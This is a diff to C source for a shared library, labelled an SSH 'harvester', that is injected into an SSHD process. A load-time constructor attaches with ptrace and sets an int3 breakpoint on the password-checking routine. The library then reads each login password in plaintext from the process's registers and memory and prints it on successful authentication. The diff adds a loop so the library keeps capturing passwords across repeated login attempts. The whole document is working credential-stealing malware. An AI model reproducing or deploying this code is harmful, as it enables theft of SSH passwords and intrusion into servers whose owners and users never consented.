@@ -1,3 +1,4 @@
+#include <sched.h>
 #define _GNU_SOURCE
 #include <errno.h>
 #include <pthread.h>
@@ -91,6 +92,71 @@ int msleep(long msec)
     return res;
 }
 
+// remove breakpoint and single step to exeute the instruction we missed at breakpoint
+void remove_breakpoint(pid_t pid, char* ptr, struct user_regs_struct regs, long* data)
+{
+    int wstatus = 0;
+    // read breakpoint
+    long ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, ptr, NULL);
+    printf("[*] Removing breakpoint\n - checking bp: %lx\n", ptrace_read);
+    // remove breakpoint so we can single step
+    if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, *data) < 0) {
+        perror("removing breakpoint");
+    }
+    regs.rip -= 1; // one byte backward, to 0xCC
+    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
+        perror("set regs");
+    }
+    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) { // exec the original code
+        perror("PTRACE_SINGLESTEP");
+    }
+    if (waitpid(pid, &wstatus, (WSTOPPED | WUNTRACED)) < 0)
+        perror("waitpid WSTOPPED, SINGLESTEP");
+
+    // breakpoint removed, check
+    ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, ptr, NULL);
+    printf(" - removed bp: %lx\n", ptrace_read);
+    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
+        perror("PTRACE_GETREGS failed");
+    }
+
+    // check where RIP points to after SINGLESTEP
+    ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, (unsigned long long)regs.rip, NULL);
+    printf("[*] Check where RIP points to after single step:\n"
+           "- RIP: 0x%llx -> %lx\n"
+           "- R8: 0x%llx\n"
+           "- RAX: 0x%llx\n",
+        regs.rip, ptrace_read, regs.r8, regs.rax);
+    puts("[+] Breakpoint removed");
+}
+
+void continue_exec(pid_t pid)
+{
+    int wstatus = 0;
+    puts("[+] Continuing");
+    // continue
+    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
+        perror("PTRACE_CONT failed");
+        ptrace(PTRACE_DETACH, pid);
+        return;
+    }
+    if (waitpid(pid, &wstatus, (WCONTINUED | WSTOPPED | WUNTRACED)) < 0) {
+        perror("continuing");
+        ptrace(PTRACE_DETACH, pid);
+        return;
+    }
+    // if the tracee has exited
+    if (WIFEXITED(wstatus)) {
+        printf("[-] SSHD session ends (pid: %d)\n", pid);
+        ptrace(PTRACE_DETACH, pid);
+        return;
+    }
+    // if the tracee is trapped
+    if (WIFSTOPPED(wstatus)) {
+        printf("[*] SSHD session trapped (pid: %d)\n", pid);
+    }
+}
+
 void* ssh_harvester(void* arg)
 {
     pid_t pid = (long)arg;
@@ -102,7 +168,7 @@ void* ssh_harvester(void* arg)
     char *ptr, *end;
     int i = 0;
     ptrace(PTRACE_ATTACH, pid);
-    printf("[+] Started Harvester for SSHD PID %d\n", pid);
+    printf("\n\n[+] Started Harvester for SSHD PID %d\n", pid);
 
     // Open the SSHD maps file and search for the SSHD process address
     char mapsfile[32];
@@ -143,13 +209,14 @@ void* ssh_harvester(void* arg)
         ptrace(PTRACE_DETACH, pid);
         pthread_exit(NULL);
     }
-
-    // write breakpoint
+    // code to patch
     long data = ptrace(PTRACE_PEEKTEXT, pid, ptr, 0); // original instruction
     long data_with_trap = (data & ~0xFF) | 0xCC;      // patch the first byte with 0xCC (int 3)
+    // write breakpoint
     printf("Patching 0x%lx to 0x%lx\n", data, data_with_trap);
     if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data_with_trap) < 0) {
         perror("PTRACE_POKETEXT insert int3");
+        ptrace(PTRACE_DETACH, pid);
         pthread_exit(NULL);
     }
     puts("[+] INT 3 written, we have set a breakpoint");
@@ -165,98 +232,67 @@ void* ssh_harvester(void* arg)
     if (waitpid(pid, &wstatus, (WSTOPPED | WUNTRACED)) < 0)
         perror("[-] resuming process: waitpid WSTOPPED");
 
-    // read RBP-pointed memory for password string, stop at NULL
-    struct user_regs_struct regs;
-    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
-    unsigned long long password_arg = (unsigned long long)regs.rbp;
-    unsigned long long pam_ret = (unsigned long long)regs.rax;
-    char password[100];
-    char* ppass = password; // points to the tail of password
-    do {
-        long val;
-        char* p;
+    if (WIFSTOPPED(wstatus)) {
+        puts("[+] Breakpoint hit");
+    }
 
-        val = ptrace(PTRACE_PEEKTEXT, pid, password_arg, NULL);
-        printf("Reading args of auth_pass at 0x%llx\n", password_arg);
-        if (val == -1) {
-            perror("[-] Failed to read password from auth_pass args");
-            ptrace(PTRACE_DETACH, pid);
-            pthread_exit(NULL);
+    while (1) {
+        puts("[+] Breakpoint hit, start working");
+
+        // read RBP-pointed memory for password string, stop at NULL
+        struct user_regs_struct regs;
+        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
+        unsigned long long password_arg = (unsigned long long)regs.rbp;
+        unsigned long long pam_ret = (unsigned long long)regs.rax;
+        char password[100];
+        char* ppass = password; // points to the tail of password
+        do {
+            long val;
+            char* p;
+
+            val = ptrace(PTRACE_PEEKTEXT, pid, password_arg, NULL);
+            printf("Reading args of auth_pass at 0x%llx\n", password_arg);
+            if (val == -1) {
+                perror("[-] Failed to read password from auth_pass args");
+                ptrace(PTRACE_DETACH, pid);
+                pthread_exit(NULL);
+            }
+            password_arg += sizeof(long);
+
+            p = (char*)&val;
+            for (i = 0; i < sizeof(long); i++, p++, ppass++) {
+                *ppass = *p;
+                if (*p == '\0')
+                    break;
+            }
+        } while (i == sizeof(long));
+        if (pam_ret != 1) {
+            printf("[-] RAX = %llx, pam auth has failed, the password '%s' is invalid\n", pam_ret, password);
+        } else {
+            printf("\n\n[+] Password is\n\n\t%s (length: %lu)\n\n", password, strlen(password));
+            remove_breakpoint(pid, ptr, regs, &data);
+            continue_exec(pid);
+            break;
         }
-        password_arg += sizeof(long);
 
-        p = (char*)&val;
-        for (i = 0; i < sizeof(long); i++, p++, ppass++) {
-            *ppass = *p;
-            if (*p == '\0')
-                break;
+        // remove bp and single step to execute the instruction we missed
+        remove_breakpoint(pid, ptr, regs, &data);
+
+        // write breakpoint back
+        if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data_with_trap) < 0) {
+            perror("PTRACE_POKETEXT insert int3");
+            break;
         }
-    } while (i == sizeof(long));
-    if (pam_ret != 1) {
-        printf("[-] RAX = %llx, pam auth has failed, the password '%s' is invalid\n", pam_ret, password);
-    } else {
-        printf("\n\n[+] Password is\n\n\t%s (length: %lu)\n\n", password, strlen(password));
+        puts("[+] Added breakpoint back");
+
+        // continue this session
+        continue_exec(pid);
+
+        // loop
+        puts("[+] SSHD continues...\n\n");
     }
 
-    // continue the session
-    // read breakpoint
-    long ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, ptr, NULL);
-    printf(" - checking bp: %lx\n", ptrace_read);
-    // remove breakpoint so we can single step
-    if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data) < 0) {
-        perror("removing breakpoint");
-    }
-    regs.rip -= 1; // one byte backward, to 0xCC
-    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
-        perror("set regs");
-    }
-    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) { // exec the original code
-        perror("PTRACE_SINGLESTEP");
-    }
-
-    if (waitpid(pid, &wstatus, (WSTOPPED | WUNTRACED)) < 0)
-        perror("waitpid WSTOPPED, SINGLESTEP");
-
-    // breakpoint removed, check
-    ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, ptr, NULL);
-    printf(" - removed bp: %lx\n", ptrace_read);
-    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
-        perror("PTRACE_GETREGS failed");
-    }
-
-    // check where RIP points to after SINGLESTEP
-    ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, (unsigned long long)regs.rip, NULL);
-    printf("\n\nCheck where RIP points to after single step:\n"
-           "- RIP: 0x%llx -> %lx\n"
-           "- R8: 0x%llx\n"
-           "- RAX: 0x%llx\n",
-        regs.rip, ptrace_read, regs.r8, regs.rax);
-    // put breakpoint back
-    puts("[*] Adding breakpoint back");
-    if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data_with_trap) < 0) {
-        perror("adding breakpoint back");
-    }
-    // continue
-    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
-        perror("PTRACE_CONT failed");
-        ptrace(PTRACE_DETACH, pid);
-        pthread_exit(NULL);
-    }
-    if (waitpid(pid, &wstatus, (WCONTINUED | WSTOPPED | WUNTRACED)) < 0) {
-        perror("continuing from SINGLESTEP");
-        ptrace(PTRACE_DETACH, pid);
-        pthread_exit(NULL);
-    }
-    puts("[*] Added breakpoint back");
-    // if the tracee has exited
-    if (WIFEXITED(wstatus)) {
-        printf("[-] SSHD session ends (pid: %d)\n", pid);
-        pthread_exit(NULL);
-    }
-
-    // continue this session
-    // loop
-    puts("[+] SSHD continues...\n\n");
+    ptrace(PTRACE_DETACH, pid);
     pthread_exit(NULL);
 }
 
@@ -304,7 +340,6 @@ void* monitor(void* arg)
 
 void __attribute__((constructor)) initLibrary(void)
 {
-    puts("Loaded");
     PID = getpid();
     printf("Loading harvester shared library to SSHD process %d\n", PID);
     pthread_t thread_id;
